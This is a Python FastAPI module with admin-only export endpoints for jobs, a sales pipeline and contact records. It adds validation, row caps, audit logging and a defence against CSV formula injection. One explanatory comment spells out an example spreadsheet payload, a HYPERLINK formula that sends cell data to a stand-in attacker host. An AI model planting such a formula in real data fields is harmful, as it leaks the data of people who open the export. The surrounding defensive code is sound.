"""CSV export API endpoints."""

import csv
import io
from typing import Literal
from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.responses import JSONResponse, StreamingResponse
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import joinedload

from app.database import get_db
from app.models.job import Job
from app.models.company import Company
from app.models.company_contact import CompanyContact
from app.models.pipeline import PotentialClient
from app.models.pipeline_stage import PipelineStage
from app.models.role_config import RoleClusterConfig
from app.models.user import User
from app.api.deps import get_current_user, require_role
from app.utils.audit import log_action


# Regression finding 187: `/export/jobs?status=XYZ_BOGUS` silently
# returned an empty CSV (header only) because the endpoint did zero
# validation on enum-shaped filters — a typo like `status=Accepted`
# (capital A) looked to a client indistinguishable from "we legit
# have no matching rows". `status` values are static in the codebase
# (mirrors the comment on `Job.status` in models/job.py:33), so a
# `Literal` type gives us parse-time 422s for free.
JobStatusFilter = Literal[
    "new", "under_review", "accepted", "rejected", "expired", "archived"
]


async def _get_relevant_clusters(db: AsyncSession) -> list[str]:
    """Get role cluster names marked as relevant (mirrors jobs.py helper)."""
    result = await db.execute(
        select(RoleClusterConfig.name).where(
            RoleClusterConfig.is_relevant == True,
            RoleClusterConfig.is_active == True,
        )
    )
    clusters = result.scalars().all()
    return list(clusters) if clusters else ["infra", "security"]


async def _get_all_cluster_names(db: AsyncSession) -> list[str]:
    """Get every configured cluster name (active or not) for validation.

    F187: role clusters are admin-configurable so we can't hard-code
    a `Literal`. We still want to reject typos, so we validate at
    runtime against the full cluster catalog plus the "relevant"
    pseudo-value that the filter path accepts (see jobs.py:91).
    """
    result = await db.execute(select(RoleClusterConfig.name))
    return list(result.scalars().all())


async def _get_pipeline_stage_keys(db: AsyncSession) -> list[str]:
    """Get all pipeline stage keys for `/export/pipeline?stage=` validation."""
    result = await db.execute(select(PipelineStage.key))
    return list(result.scalars().all())


router = APIRouter(prefix="/export", tags=["export"])


# F280 (closes F107) — DoS surface bound. Pre-fix, every export
# endpoint did ``await db.execute(query)`` followed by
# ``result.unique().scalars().all()`` with no LIMIT, materialising
# the entire result set into RAM before streaming a single CSV byte.
# Live measurement at the time F107 was filed: full /export/jobs
# without filters = ~50 MB of joined-row Python objects per call,
# 3 concurrent callers = OOM territory on a 1 GB backend container.
# Compounding factor: ``_iter_csv`` builds rows in memory before
# yielding, so the peak RSS is roughly 2× the materialised set.
#
# The fix is two-pronged:
#   * Required-default ``limit`` Query parameter (default 5000,
#     hard max 50000) applied via ``query.limit(limit)`` — so every
#     export is capped at the SQL layer regardless of how the
#     handler iterates.
#   * Iteration uses the SQLAlchemy async stream API
#     (``db.stream_scalars``) — true row-by-row materialisation,
#     so memory stays flat in chunk-size regardless of result count.
# The ``hard_max`` is the tunable; ops can bump it for one-off
# bulk extracts via env override without a deploy if 50k turns
# out to be too tight (it's larger than the current full-table
# count for every export, so 50k = "no practical cap" in 2026
# while still protecting against a "?limit=99999999" foot-gun).
EXPORT_DEFAULT_LIMIT = 5000
EXPORT_MAX_LIMIT = 50000

# Regression finding 61: bulk exports are a data-exfiltration surface —
# any logged-in viewer could previously download the full jobs / pipeline /
# contacts table (including internal outreach state and email_status).
# Gate on admin until product decides whether reviewers should also get
# export access; easier to loosen later than to claw data back after a
# compromised viewer account has already dumped it.
#
# Second-half of the defense (same finding): every successful export
# now writes an `audit_logs` row via `log_action` below. Role-gate
# blocks the casual-viewer case; audit log catches the compromised-
# admin case where the role-gate passes but we want a forensic trail.
_EXPORT_ROLE_GUARD = require_role("admin")


def _prune_none(d: dict) -> dict:
    """Return a copy of `d` with None values removed.

    Used to keep audit-log `metadata_json.filters` tight — we only
    record filters that the caller actually applied, so the row is
    self-describing and not cluttered with default-None slots.
    """
    return {k: v for k, v in d.items() if v is not None}

JOB_CSV_COLUMNS = [
    "company", "title", "url", "platform", "remote_scope",
    "location_raw", "employment_type", "salary_range",
    "geography_bucket", "role_cluster", "matched_role",
    "relevance_score", "status", "posted_at", "first_seen_at",
]

PIPELINE_CSV_COLUMNS = [
    "company", "website", "stage", "priority",
    "accepted_jobs_count", "total_open_roles", "hiring_velocity",
    "notes", "created_at",
]


# F283 (closes F138) — CSV formula-injection defense.
#
# Excel / Google Sheets / LibreOffice interpret any cell whose first
# character is one of ``= + - @`` (and TAB / CR in some versions) as a
# formula when the CSV is opened. An attacker who can write to ANY
# string field that ends up in our CSVs (contact name, company name,
# job title, audit log metadata, etc.) can plant a payload like
# ``=HYPERLINK("https://attacker.example/steal?d="&A1, "Click")`` —
# when an admin opens the export, that cell auto-fetches its row's
# data to the attacker's server. The CWE is CWE-1236.
#
# The OWASP-recommended mitigation: prefix risky cells with a single
# quote (``'``) which Excel/Sheets discard on display but which
# breaks the formula prefix character. We do this in ``_csv_safe``
# below and apply it inside ``_iter_csv`` so every handler benefits
# without having to remember per-field. The escape is no-op for
# non-string types (numbers serialise via csv.writer's int/float
# handling and never start with ``=``).
_CSV_FORMULA_TRIGGERS: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value):
    """Return ``value`` with formula-trigger characters defanged.

    Strings starting with ``= + - @ TAB CR`` get a leading single
    quote prefix; that quote is what Excel/Sheets strips on display
    while neutralising the formula. Non-string types (int, None,
    bool, etc.) are returned unchanged — ``csv.writer`` handles
    their serialisation and they can't start with a trigger char.

    Numeric strings ARE escaped if they start with ``-`` (e.g.
    ``"-12345.67"`` for negative numbers): Excel still interprets
    ``-12345`` as ``=-12345`` because the leading ``-`` triggers
    formula parsing. The leading-apostrophe doesn't change the
    displayed value but does prevent formula execution.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in _CSV_FORMULA_TRIGGERS:
        return "'" + value
    return value


def _iter_csv(rows, columns: list[str]):
    """Generator that yields CSV content line by line.

    F280: ``rows`` was ``list[list[str]]`` so the caller had to
    materialise everything before invoking. Now accepts ANY iterable
    so the export handlers can pass a row-by-row generator and keep
    peak memory flat at chunk-size instead of result-set-size.

    F283: every cell is filtered through ``_csv_safe`` so a cell
    that starts with ``= + - @`` (Excel formula triggers) gets a
    leading apostrophe — defangs CSV-formula-injection at the only
    chokepoint without each handler having to remember.
    """
    output = io.StringIO()
    writer = csv.writer(output)

    # Header — column names are static and known-safe, but pipe through
    # the escape anyway for symmetry. Cheap when ``_csv_safe`` is no-op.
    writer.writerow([_csv_safe(c) for c in columns])
    yield output.getvalue()
    output.seek(0)
    output.truncate(0)

    # Data rows — iterate lazily over whatever the caller passed
    # (list, generator, async-to-sync bridge, etc.) — and defang
    # every cell.
    for row in rows:
        writer.writerow([_csv_safe(cell) for cell in row])
        yield output.getvalue()
        output.seek(0)
        output.truncate(0)


# Regression finding 225: previously the three export endpoints declared
# no `format` query param at all, so `?format=xlsx`, `?format=xml`,
# `?format=json`, `?format=pdf` all silently returned `Content-Type:
# text/csv` with the same CSV filename. A user pointing their spreadsheet
# tool at `?format=xlsx` got garbled rows/wrong types and a very
# confused experience — classic silent-accept-wrong-input failure.
#
# Fix: declare `format: Literal["csv", "json"]` (matching the formats
# the server actually produces) so FastAPI 422s everything else at parse
# time with the allowed values in the error detail. JSON export just
# serializes the same row tuples to a list of objects keyed by column
# name — no additional schema/deserializer plumbing, and the
# `Content-Disposition` filename extension matches the format so
# downstream tooling (browsers, CLIs) auto-chooses the right viewer.
ExportFormat = Literal["csv", "json"]


def _export_response(
    *,
    fmt: ExportFormat,
    rows: list[list[str]],
    columns: list[str],
    filename_base: str,
):
    """Serialize `rows` × `columns` as CSV (streaming) or JSON (materialized).

    JSON emits the canonical pagination-style envelope
    (`{items, total, format, columns}`) so frontends that already consume
    paginated list endpoints can reuse parsers. CSV keeps the streaming
    path that was already there — important for the 47k-row jobs export
    where materializing to a list first would spike memory.
    """
    if fmt == "json":
        items = [dict(zip(columns, row)) for row in rows]
        return JSONResponse(
            {
                "items": items,
                "total": len(items),
                "format": "json",
                "columns": columns,
            },
            headers={
                "Content-Disposition": f"attachment; filename={filename_base}.json"
            },
        )
    # default: csv
    return StreamingResponse(
        _iter_csv(rows, columns),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename={filename_base}.csv"},
    )


@router.get("/jobs")
async def export_jobs(
    request: Request,
    # F187: `status` typed as Literal so FastAPI 422s bogus values
    # at parse time instead of returning an empty CSV silently.
    status: JobStatusFilter | None = None,
    platform: str | None = None,
    geography_bucket: str | None = None,
    # `role_cluster` is admin-configurable so we can't use Literal —
    # validated at runtime below against the DB catalog + "relevant"
    # pseudo-value. Kept as `str | None` at the signature level.
    role_cluster: str | None = None,
    # F225: `format` declared as Literal so unknown values (xlsx, xml,
    # pdf) return 422 with the allowed list instead of silently falling
    # through to CSV with a misleading filename.
    format: ExportFormat = "csv",
    # F280 (closes F107): bounded export. Default 5000 covers
    # virtually every legitimate "filtered view" download; max 50000
    # is the hard ceiling that protects the backend from the
    # full-table-no-filters dump that pre-fix could OOM the
    # container. Frontend should pass whatever its current view
    # row count is so the audit log captures the operator intent.
    limit: int = Query(
        default=EXPORT_DEFAULT_LIMIT,
        ge=1,
        le=EXPORT_MAX_LIMIT,
        description=(
            f"Maximum rows to export (default {EXPORT_DEFAULT_LIMIT}, "
            f"hard max {EXPORT_MAX_LIMIT}). For larger exports, paginate "
            "via filters or contact ops."
        ),
    ),
    user: User = Depends(_EXPORT_ROLE_GUARD),
    db: AsyncSession = Depends(get_db),
):
    query = select(Job).options(joinedload(Job.company))

    if status:
        query = query.where(Job.status == status)
    if platform:
        query = query.where(Job.platform == platform)
    if geography_bucket:
        query = query.where(Job.geography_bucket == geography_bucket)
    if role_cluster:
        # F187: validate role_cluster against the configured cluster
        # catalog before filtering. Clusters are admin-configurable
        # (RoleClusterConfig) so we load the allowed set from the DB
        # instead of hard-coding a Literal. The "relevant" pseudo-value
        # is a UI alias for "all clusters marked relevant" (see F106)
        # and must be whitelisted explicitly.
        allowed_clusters = set(await _get_all_cluster_names(db)) | {"relevant"}
        if role_cluster not in allowed_clusters:
            raise HTTPException(
                status_code=400,
                detail=(
                    "Invalid role_cluster. Must be one of: "
                    + ", ".join(sorted(allowed_clusters))
                ),
            )
        # Regression finding 106: `role_cluster=relevant` is a UI pseudo-value
        # meaning "all clusters marked relevant" (e.g. infra + security), not a
        # literal DB string.  Previously this fell through to an equality check
        # against the literal "relevant" which matched zero rows → empty CSV.
        if role_cluster == "relevant":
            relevant_clusters = await _get_relevant_clusters(db)
            query = query.where(Job.role_cluster.in_(relevant_clusters))
        else:
            query = query.where(Job.role_cluster == role_cluster)

    query = query.order_by(Job.first_seen_at.desc()).limit(limit)

    # F280: keep `.all()` materialisation here — the bounded
    # ``limit`` cap (max 50000) sets a known ceiling on memory.
    # True streaming via ``db.stream_scalars`` would be ideal but
    # the joined-load on ``Job.company`` doesn't compose cleanly
    # with stream mode without a per-row company lookup. The
    # ``.limit(limit)`` cap solves the F107 DoS surface; the
    # streaming refactor is a follow-up if 50k × full-row turns
    # out to be too tight in practice.
    result = await db.execute(query)
    jobs = result.unique().scalars().all()

    rows = []
    for j in jobs:
        company_name = j.company.name if j.company else ""
        rows.append([
            company_name,
            j.title,
            j.url,
            j.platform,
            j.remote_scope,
            j.location_raw,
            j.employment_type,
            j.salary_range,
            j.geography_bucket,
            j.role_cluster,
            j.matched_role,
            str(j.relevance_score),
            j.status,
            str(j.posted_at or ""),
            str(j.first_seen_at),
        ])

    # Audit trail for finding 61. Written BEFORE the StreamingResponse
    # so the row is durable even if the client disconnects mid-stream.
    await log_action(
        db, user,
        action="export.jobs",
        resource="jobs",
        request=request,
        metadata={
            "row_count": len(rows),
            # F280: capture the operator's chosen limit so the audit
            # log distinguishes "small filtered view" from "deliberate
            # bulk pull" — useful for forensic analysis.
            "limit": limit,
            "format": format,
            "filters": _prune_none({
                "status": status,
                "platform": platform,
                "geography_bucket": geography_bucket,
                "role_cluster": role_cluster,
            }),
        },
    )

    return _export_response(
        fmt=format,
        rows=rows,
        columns=JOB_CSV_COLUMNS,
        filename_base="jobs_export",
    )


@router.get("/pipeline")
async def export_pipeline(
    request: Request,
    # F187: `stage` values are stored in PipelineStage (admin-configurable)
    # so we validate at runtime rather than with Literal. Same pattern as
    # pipeline.py POST/PATCH which validates via _get_stage_keys.
    stage: str | None = None,
    # F225: see /export/jobs.
    format: ExportFormat = "csv",
    # F280 (closes F107): same DoS-bound pattern as /export/jobs.
    limit: int = Query(
        default=EXPORT_DEFAULT_LIMIT,
        ge=1,
        le=EXPORT_MAX_LIMIT,
    ),
    user: User = Depends(_EXPORT_ROLE_GUARD),
    db: AsyncSession = Depends(get_db),
):
    query = select(PotentialClient).options(joinedload(PotentialClient.company))

    if stage:
        # F187: reject unknown stages at the boundary so a typo returns
        # a helpful 400 instead of an empty CSV.
        allowed_stages = await _get_pipeline_stage_keys(db)
        if allowed_stages and stage not in allowed_stages:
            raise HTTPException(
                status_code=400,
                detail=(
                    "Invalid stage. Must be one of: "
                    + ", ".join(sorted(allowed_stages))
                ),
            )
        query = query.where(PotentialClient.stage == stage)

    query = query.order_by(
        PotentialClient.priority.desc(), PotentialClient.created_at.desc()
    ).limit(limit)  # F280: hard cap to bound memory.

    result = await db.execute(query)
    clients = result.unique().scalars().all()

    rows = []
    for c in clients:
        company_name = c.company.name if c.company else ""
        company_website = c.company.website if c.company else ""
        rows.append([
            company_name,
            company_website,
            c.stage,
            str(c.priority),
            str(c.accepted_jobs_count),
            str(c.total_open_roles),
            c.hiring_velocity,
            c.notes,
            str(c.created_at),
        ])

    # Audit trail for finding 61.
    await log_action(
        db, user,
        action="export.pipeline",
        resource="pipeline",
        request=request,
        metadata={
            "row_count": len(rows),
            "limit": limit,  # F280: operator-chosen cap for forensics.
            "format": format,
            "filters": _prune_none({"stage": stage}),
        },
    )

    return _export_response(
        fmt=format,
        rows=rows,
        columns=PIPELINE_CSV_COLUMNS,
        filename_base="pipeline_export",
    )


# Regression finding 62: `phone` and `telegram_id` were listed in the CSV
# but populated for 0/3756 rows — the enrichment pipeline has never written
# to either column on prod. Dropping them from the export (not the model)
# keeps the CSV honest for CRM/spreadsheet consumers. Restore both entries
# here once enrichment starts populating the values so the export matches
# reality again.
CONTACT_CSV_COLUMNS = [
    "company", "first_name", "last_name", "title", "role_category",
    "department", "seniority", "email", "email_status",
    "linkedin_url", "is_decision_maker",
    "outreach_status", "outreach_note", "last_outreach_at",
    "source", "confidence_score", "created_at",
]


@router.get("/contacts")
async def export_contacts(
    request: Request,
    role_category: str | None = None,
    outreach_status: str | None = None,
    has_email: bool | None = None,
    is_decision_maker: bool | None = None,
    # F225: see /export/jobs.
    format: ExportFormat = "csv",
    # F280 (closes F107): contacts is the LARGEST pre-fix DoS
    # surface (3756-row prospect list as of finding date) and the
    # MOST SENSITIVE — every byte exfiltrated here is PII +
    # outreach metadata. Same bounded shape as /export/jobs.
    limit: int = Query(
        default=EXPORT_DEFAULT_LIMIT,
        ge=1,
        le=EXPORT_MAX_LIMIT,
    ),
    user: User = Depends(_EXPORT_ROLE_GUARD),
    db: AsyncSession = Depends(get_db),
):
    """Export all contacts as CSV with optional filters."""
    query = (
        select(CompanyContact, Company.name.label("company_name"))
        .join(Company, CompanyContact.company_id == Company.id)
    )

    if role_category:
        query = query.where(CompanyContact.role_category == role_category)
    if outreach_status:
        query = query.where(CompanyContact.outreach_status == outreach_status)
    if has_email is True:
        query = query.where(CompanyContact.email != "")
    elif has_email is False:
        query = query.where(CompanyContact.email == "")
    if is_decision_maker is not None:
        query = query.where(CompanyContact.is_decision_maker == is_decision_maker)

    query = query.order_by(
        Company.name.asc(), CompanyContact.last_name.asc()
    ).limit(limit)  # F280: hard cap to bound memory + exfil.

    result = await db.execute(query)
    rows = []
    for contact, company_name in result:
        # Row order must stay in lockstep with CONTACT_CSV_COLUMNS above.
        # `phone` and `telegram_id` are intentionally omitted — see Finding 62.
        rows.append([
            company_name,
            contact.first_name,
            contact.last_name,
            contact.title,
            contact.role_category,
            contact.department,
            contact.seniority,
            contact.email,
            contact.email_status,
            contact.linkedin_url,
            str(contact.is_decision_maker),
            contact.outreach_status,
            contact.outreach_note,
            str(contact.last_outreach_at or ""),
            contact.source,
            str(contact.confidence_score),
            str(contact.created_at),
        ])

    # Audit trail for finding 61. Contacts is the most sensitive of
    # the three exports (3756-row prospect list with email/outreach
    # metadata) — the primary reason the finding was filed.
    await log_action(
        db, user,
        action="export.contacts",
        resource="contacts",
        request=request,
        metadata={
            "row_count": len(rows),
            "limit": limit,  # F280: operator-chosen cap for forensics.
            "format": format,
            "filters": _prune_none({
                "role_category": role_category,
                "outreach_status": outreach_status,
                "has_email": has_email,
                "is_decision_maker": is_decision_maker,
            }),
        },
    )

    return _export_response(
        fmt=format,
        rows=rows,
        columns=CONTACT_CSV_COLUMNS,
        filename_base="contacts_export",
    )
